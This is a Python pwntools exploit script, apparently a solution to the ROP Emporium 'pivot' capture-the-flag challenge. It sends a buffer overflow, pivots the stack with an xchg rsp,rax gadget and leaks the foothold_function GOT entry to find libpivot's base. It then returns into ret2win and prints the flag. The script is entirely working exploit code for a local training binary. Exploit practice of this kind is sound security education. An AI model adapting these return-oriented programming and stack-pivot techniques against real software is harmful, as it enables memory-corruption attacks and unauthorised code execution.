#/usr/bin/python3
from pwn import process, p64, u64, log, gdb

shell = process("./pivot")

offset = 40
junk = b"A" * offset

shell.recvuntil(b"pivot: ")
pivot = int(shell.recvline().strip(), 16)

foothold_plt = p64(0x400720)
foothold_got = p64(0x601040)
puts = p64(0x4006e0)
main = p64(0x400847)

xchg_rsp_rax = p64(0x4009bd)
pop_rdi = p64(0x400a33)
pop_rax = p64(0x4009bb)
ret = p64(0x4006b6)

payload  = b""
payload += foothold_plt
payload += pop_rdi + foothold_got
payload += puts
payload += main

shell.sendlineafter(b"> ", payload)

payload  = b""
payload += junk
payload += pop_rax + p64(pivot)
payload += xchg_rsp_rax

shell.sendlineafter(b"> ", payload)

shell.recvuntil(b'libpivot\n')
ret2win = u64(shell.recvline().strip().ljust(8, b"\x00")) + 0x117

payload  = b""
payload += junk
payload += ret
payload += p64(ret2win)

shell.sendlineafter(b"> ", payload)

flag = shell.recvline_contains(b"ROPE").decode()
log.info(f"Flag: {flag}")
